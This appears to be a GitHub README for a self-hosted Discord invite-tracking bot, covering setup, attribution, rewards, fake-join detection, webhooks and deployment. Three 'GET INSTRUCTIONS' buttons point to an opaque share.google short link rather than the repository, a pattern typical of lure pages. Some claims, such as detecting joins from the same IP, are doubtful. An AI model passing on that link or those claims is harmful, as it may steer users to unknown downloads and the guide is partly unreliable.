# 🎟️ Discord Invite Tracker — Complete Guide

<div align="center">

![Discord](https://img.shields.io/badge/Discord-Invite%20Tracker-5865F2?style=for-the-badge&logo=discord&logoColor=white)
![Analytics](https://img.shields.io/badge/Analytics-Real--Time-EC4899?style=for-the-badge&logo=googleanalytics&logoColor=white)
![Bot](https://img.shields.io/badge/Bot-Multi--Server-16A34A?style=for-the-badge&logo=probot&logoColor=white)
![Guides](https://img.shields.io/badge/Guides-95K-F59E0B?style=for-the-badge&logo=readthedocs&logoColor=black)

### 📊 Track Who Invited Whom — Attribution, Analytics & Growth Insights

*A complete guide to building and running a Discord invite tracking system*

</div>

<div align="center">

<img width="1280" height="720" alt="maxresdefault (84)" src="https://github.com/user-attachments/assets/26d91960-bf71-4b43-8a3c-157c62f2c56d" />

</div>

---

## 🎯 What's Your Goal?

> **⏱️ Answer one question to skip ahead**

**🅰️ "I want this running today"** → [Quick Start](#-quick-start-15-minutes)

**🅱️ "I want to understand it first"** → [Concept Map](#-concept-map)

**🅲 "I want to self-host on my VPS"** → [Deployment](#-deployment-paths)

**🅳 "I want to configure rewards"** → [Rewards System](#-rewards-system)

**🅴 "Something's broken"** → [Troubleshooting](#-troubleshooting)

---

## 🗺️ Concept Map

> **🎨 How the pieces fit together**

```
┌──────────────────────────────────────────────────┐
│                    DISCORD                       │
│  ┌──────────┐   Join   ┌───────────┐            │
│  │  Member  │ ───────► │  Server   │            │
│  └──────────┘          └─────┬─────┘            │
│         ▲                    │                   │
│         │ invite             │ event             │
│         │                    ▼                   │
│  ┌──────┴──────┐     ┌───────────────┐          │
│  │  Inviter    │     │  Invite Bot   │          │
│  └─────────────┘     └───────┬───────┘          │
│                              │                   │
└──────────────────────────────┼───────────────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                ▼
        ┌──────────┐    ┌────────────┐   ┌──────────┐
        │ Database │    │ Dashboard  │   │ Webhooks │
        └──────────┘    └────────────┘   └──────────┘
```

### 🧩 Key Building Blocks

| Block | Role |
|-------|------|
| 🎟️ **Invite Code** | Unique per creation |
| 🎯 **Attribution** | Match join to invite |
| 📊 **Cache** | Invite-use snapshots |
| 🗄️ **Database** | Persistent history |
| 📈 **Dashboard** | Web analytics UI |
| 🔔 **Webhooks** | Outbound events |

---

## 🎯 Overview

**Discord Invite Tracker** records every member who joins your server, identifies **who invited them**, tracks how long they stay, and provides analytics to help you grow your community intelligently.

Whether you're running a creator server, gaming clan, study group, or business community — knowing your invite sources is essential for rewarding ambassadors, spotting fake joins, and understanding what's actually driving growth.

### 🧩 What It Does

| Function | Purpose |
|----------|---------|
| 🔍 **Join Tracking** | Who joined, when |
| 🎯 **Attribution** | Which invite was used |
| 👤 **Inviter Identity** | Who created the invite |
| ⏱️ **Retention** | Stay duration |
| 📊 **Leaderboard** | Top inviters |
| 🚫 **Fake Detect** | Alt-account filtering |
| 🎁 **Reward Hooks** | Auto-role grants |
| 📈 **Growth Charts** | Trend analysis |

---

## ⭐ Features At A Glance

| Feature | Description |
|---------|-------------|
| 📊 **Live Dashboard** | Real-time join feed |
| 🎯 **Accurate Attribution** | Per-invite tracking |
| 🚫 **Alt Detection** | Account age, behavior |
| 🏆 **Leaderboards** | Weekly / monthly / all-time |
| 🎁 **Auto-Rewards** | Roles for milestones |
| 🔔 **Webhooks** | Send data anywhere |
| 🗂️ **Multi-Server** | One bot, many guilds |
| 📤 **CSV / JSON Export** | Full data access |
| 🌍 **Multi-Language** | UI in 15+ languages |
| 🔒 **Privacy Mode** | Anonymize members |

---

## 🚀 Quick Start (15 Minutes)

### 🪜 Step 1 — Create Bot

Go to **discord.com/developers/applications** → New Application → Bot tab.

Enable:
- ✅ **Server Members Intent**
- ✅ **Message Content Intent**

Copy the **Bot Token**.

### 🪜 Step 2 — Clone & Install

```bash
git clone https://github.com/your-org/discord-invite-tracker.git
cd discord-invite-tracker
npm install
```

### 🪜 Step 3 — Configure

```env
DISCORD_TOKEN=your_bot_token_here
CLIENT_ID=your_client_id
DATABASE_URL=postgresql://user:pass@localhost:5432/invite_tracker
REDIS_URL=redis://localhost:6379
DASHBOARD_PORT=8080
FAKE_DETECTION=true
AUTO_REWARDS=true
```

### 🪜 Step 4 — Run

```bash
npm run migrate
npm start
```

Expected:

```
✅ Connected to Discord
✅ Logged in as InviteTracker#1234
✅ Cache loaded: 45 guilds
✅ Dashboard on http://localhost:8080
```

### 🪜 Step 5 — Invite & Test

Use the OAuth2 URL with `bot applications.commands` scopes. Then have someone join with your invite and watch the dashboard light up.

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-5865F2?style=for-the-badge&logo=discord&logoColor=white&labelColor=312E81)](https://share.google/2ojDMilG9zEcNrMF6)

</div>

---

## 📘 Get Instructions

<div align="center">

### 🚀 Access the Official Setup Guide

Click below to reach the instructions portal:

<br>

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-EC4899?style=for-the-badge&logo=discord&logoColor=white&labelColor=9D174D)](https://share.google/2ojDMilG9zEcNrMF6)

<br>

*Open Source • Self-Hostable • Updated 2025*

</div>

### 📚 Available Guides

| Guide | Purpose |
|-------|---------|
| 📘 **Setup Guide** | Install and invite bot |
| 📗 **Configuration** | Customize behavior |
| 📙 **Dashboard Guide** | Use the web UI |
| 📕 **Rewards Guide** | Set up auto-roles |
| 📓 **Deployment Guide** | VPS, Docker, cloud |

---

## 🖥️ System Requirements

### 🔹 Minimum

```
✅ OS: Linux / Windows / macOS
✅ CPU: Dual-core 2.0 GHz
✅ RAM: 2 GB
✅ Storage: 5 GB
✅ Runtime: Node.js 18+ or Python 3.10+
✅ Database: PostgreSQL 14+ or SQLite
✅ Discord Bot Token: Required
✅ Internet: Stable 10 Mbps
```

### 🔸 Recommended

```
⭐ OS: Ubuntu 22.04 LTS / Debian 12
⭐ CPU: Quad-core 2.5 GHz+
⭐ RAM: 8 GB
⭐ Storage: 50 GB SSD
⭐ Database: PostgreSQL 15+
⭐ Cache: Redis 7+
⭐ Deployment: Docker / Docker Compose
⭐ Monitoring: Prometheus + Grafana
⭐ Backups: Daily automated
```

### 🔐 Required Permissions

| Permission | Why |
|------------|-----|
| 📖 **View Channels** | Read invite info |
| 🎟️ **Manage Server** | Read full invite list |
| 👥 **View Members** | Track joins |
| 🎭 **Manage Roles** | Auto-reward |
| 📨 **Send Messages** | Notifications |
| 🔗 **Create Invites** | Fallback tracking |

---

## 📊 Dashboard Overview

### 🖥️ Main Views

| Panel | Shows |
|-------|-------|
| 🏠 **Home** | Live join feed |
| 📈 **Growth** | Charts by day/week |
| 🏆 **Leaderboard** | Top inviters |
| 👥 **Members** | Per-member history |
| 🎟️ **Invites** | All active invites |
| ⚙️ **Settings** | Configuration |

### 📈 Growth Metrics

| Metric | Description |
|--------|-------------|
| 📊 **Joins Today** | Daily count |
| 📅 **Weekly Growth** | 7-day trend |
| 📉 **Leaves** | Departures |
| 📊 **Net Growth** | Joins − leaves |
| ⏱️ **Retention** | % staying 7+ days |
| 🚫 **Fake Ratio** | Suspicious joins |

---

## 🎯 Attribution Logic

### 📋 How It Works

```
1. Bot fetches current invite uses
2. Compares to cached snapshot
3. Identifies the invite with +1 use
4. Looks up the invite creator
5. Records attribution
```

### ⚠️ Edge Cases

| Situation | Behavior |
|-----------|----------|
| 🚫 Vanity URL used | Attributed to "Vanity" |
| 👻 Unknown invite | Attributed to "Unknown" |
| 🔄 Simultaneous joins | Best-effort match |
| 🎟️ Invite deleted | Still logged by code |
| ⏱️ Server discovery | Attributed to "Discovery" |

---

## 🏆 Leaderboards

### 📊 Leaderboard Types

| Type | Period |
|------|--------|
| 🥇 **Daily** | Resets at midnight |
| 🥈 **Weekly** | Resets Sunday |
| 🥉 **Monthly** | Resets on the 1st |
| 👑 **All-Time** | Never resets |

---

## 🎁 Rewards System

### ⚙️ Configure Rewards

```yaml
rewards:
  - name: "Bronze"
    threshold: 5
    role: "Bronze Inviter"
  
  - name: "Silver"
    threshold: 25
    role: "Silver Inviter"
  
  - name: "Gold"
    threshold: 100
    role: "Gold Inviter"
```

### 🎯 Example Thresholds

| Threshold | Reward |
|-----------|--------|
| 5 invites | 🥉 Bronze role |
| 25 invites | 🥈 Silver role |
| 100 invites | 🥇 Gold role |
| 500 invites | 💎 Diamond role |

---

## 🚫 Fake Invite Detection

### 🔍 Detection Heuristics

| Signal | Weight |
|--------|:------:|
| 👤 Account age < 7 days | High |
| 🖼️ No avatar | Medium |
| 📛 Random username | Medium |
| ⏱️ Joins and leaves < 1 min | High |
| 🔁 Multiple joins from same IP | High |
| 🚫 Previously flagged account | High |

### ⚙️ Configure Detection

```yaml
fakeDetection:
  enabled: true
  minAccountAge: 7
  flagNoAvatar: true
  flagFastLeave: true
  threshold: 50
```

---

## 🔔 Webhooks & Integrations

### 📡 Available Webhooks

| Event | Payload |
|-------|---------|
| `member.joined` | User + invite |
| `member.left` | User + duration |
| `reward.granted` | User + role |
| `fake.detected` | User + signals |

### 🔗 Sample Webhook

```bash
curl -X POST https://your-server.com/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "event": "member.joined",
    "user": "newuser#1234",
    "inviter": "moderator#5678",
    "inviteCode": "abc123",
    "timestamp": "2025-01-15T14:23:11Z"
  }'
```

---

## 🚢 Deployment Paths

### 🏠 Local Development

```bash
npm run dev
```

### ☁️ VPS (Ubuntu)

```bash
# Install Node.js and PostgreSQL
sudo apt install nodejs postgresql redis-server

# Use PM2 for process management
npm install -g pm2
pm2 start npm --name invite-tracker -- start
pm2 save && pm2 startup
```

### 🐳 Docker Compose

```yaml
version: "3.9"
services:
  bot:
    build: .
    env_file: .env
    depends_on: [db, redis]
  db:
    image: postgres:15
    volumes: [pgdata:/var/lib/postgresql/data]
  redis:
    image: redis:7
volumes:
  pgdata:
```

### ☁️ Cloud (Railway / Render / Fly.io)

Deploy directly with the official Dockerfile.

---

## 🌐 Multi-Server Support

| Feature | Notes |
|---------|-------|
| 🗂️ **Per-guild data** | Isolated |
| 📊 **Per-guild dashboard** | Separate views |
| 🎛️ **Per-guild settings** | Custom rules |
| 🔐 **Per-guild roles** | Independent rewards |
| 👥 **Shared commands** | Global slash commands |

---

## 🧪 Verification

| Check | Method | Expected |
|-------|--------|----------|
| ✅ Bot online | Discord | Green status |
| ✅ Dashboard loads | Browser | UI visible |
| ✅ Join tracked | Test invite | Entry created |
| ✅ Inviter correct | Verify | Matches |
| ✅ Leaderboard updates | Join someone | Rank changes |
| ✅ Rewards fire | Hit threshold | Role granted |
| ✅ Fake detected | Test alt | Flagged |
| ✅ Webhook delivers | Test POST | 200 OK |

---

## 🩺 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| 🚫 Bot offline | Crash | Check logs |
| 🚫 No joins tracked | Missing intent | Enable Members Intent |
| 🚫 Wrong inviter | Cache stale | Restart bot |
| 🚫 Dashboard 404 | Port | Check config |
| 🚫 Rewards not firing | Missing perm | Grant Manage Roles |
| 🚫 Fake detection too strict | Threshold | Adjust score |
| 🚫 Database errors | Connection | Check URL |
| 🚫 High CPU | Cache growth | Enable Redis |
| 🚫 Slash commands missing | Not deployed | Run deploy script |
| 🚫 Rate limited | Too many calls | Add delay |

### 🔄 Restart Safely

```bash
pm2 restart invite-tracker
# or
systemctl restart invite-tracker
```

---

## 🧰 Command Reference

| Command | Purpose |
|---------|---------|
| `/invites` | Your invite stats |
| `/invites @user` | Someone else's stats |
| `/leaderboard` | Top inviters |
| `/invitecodes` | All your codes |
| `/whois @user` | Who invited them |
| `/tracker settings` | Bot config |
| `/tracker export` | Data export |
| `/tracker reset` | Reset counters |

---

## 🔌 API Reference

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/guilds/:id/joins` | GET | Recent joins |
| `/api/guilds/:id/leaderboard` | GET | Rankings |
| `/api/users/:id/invites` | GET | User stats |
| `/api/invites` | POST | Create tracked invite |
| `/api/export` | GET | Bulk export |
| `/api/health` | GET | Status check |

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **Official Docs** | Full reference |
| 💬 **Discord Server** | Support |
| 🐛 **GitHub Issues** | Bug reports |
| 🎥 **Video Guides** | Walkthroughs |
| 📊 **API Docs** | Endpoint reference |

---

## 💬 FAQ

**Is this against Discord ToS?**
No — it uses official APIs and respects user privacy.

**Do I need to self-host?**
You can, or use a hosted version.

**Does it work on multiple servers?**
Yes — a single bot can track many guilds.

**What if someone uses a vanity URL?**
It's tracked as a "Vanity" source.

**Can I export data?**
Yes — CSV, JSON, and webhook delivery.

**Does it detect bots joining?**
Yes — bot accounts are flagged separately.

**Can members opt out?**
Yes — configure an opt-out command.

**Does it work with slash commands?**
Yes — full slash command support.

**Is there a free tier?**
The self-hosted version is free.

**Is my data safe?**
Yes — everything stays in your database.

---

## 📅 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **3.2.0** | Jan 2025 | Fake detection v2 |
| 3.0.0 | Oct 2024 | Multi-server dashboard |
| 2.5.0 | Jun 2024 | Webhook system |
| 2.0.0 | Feb 2024 | Initial release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-F59E0B?style=for-the-badge&logo=discord&logoColor=black&labelColor=92400E)](https://share.google/2ojDMilG9zEcNrMF6)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the Discord community*

</div>
